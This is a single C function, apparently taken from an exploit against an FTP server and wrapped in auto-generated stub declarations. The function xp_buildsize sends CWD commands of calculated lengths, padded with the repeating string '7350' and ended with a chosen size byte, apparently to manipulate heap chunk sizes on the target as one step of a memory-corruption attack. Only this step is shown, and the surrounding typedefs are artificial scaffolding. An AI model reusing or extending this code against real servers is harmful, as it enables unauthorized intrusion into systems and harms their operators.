
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int tmpbuf ;


 int CHUNK_STRROUNDDOWN (unsigned long) ;
 scalar_t__ debugmode ;
 int ftp_recv_until (int,unsigned char*,int,char*) ;
 int memset (unsigned char*,char,int) ;
 int net_write (int,char*,unsigned char*,...) ;
 int printf (char*,unsigned char*) ;
 int xp_gapfill (int,int,int ) ;

void
xp_buildsize (int fd, unsigned char this_size_ls, unsigned long int csize)
{
        int n,
                        cw;
        unsigned char tmpbuf[512];
        unsigned char * leet = "7350";


        for (n = 2 ; n > 0 ; --n) {
                memset (tmpbuf, '\0', sizeof (tmpbuf));

                for (cw = 0 ; cw < (csize - 0x08) ; ++cw)
                        tmpbuf[cw] = leet[cw % 4];

                tmpbuf[cw - 4 + n] = '\0';
                if (debugmode)
                        printf (": CWD %s\n", tmpbuf);

                net_write (fd, "CWD %s\n", tmpbuf);
                ftp_recv_until (fd, tmpbuf, sizeof (tmpbuf), "550 ");
        }

        memset (tmpbuf, '\0', sizeof (tmpbuf));
        for (cw = 0 ; cw < (csize - 0x08 - 0x04) ; ++cw)
                tmpbuf[cw] = leet[cw % 4];

        if (debugmode)
                printf ("| CWD %s\n", tmpbuf);

        net_write (fd, "CWD %s%c\n", tmpbuf, this_size_ls);
        ftp_recv_until (fd, tmpbuf, sizeof (tmpbuf), "550 ");




        xp_gapfill (fd, 1, CHUNK_STRROUNDDOWN (csize));


        return;
}
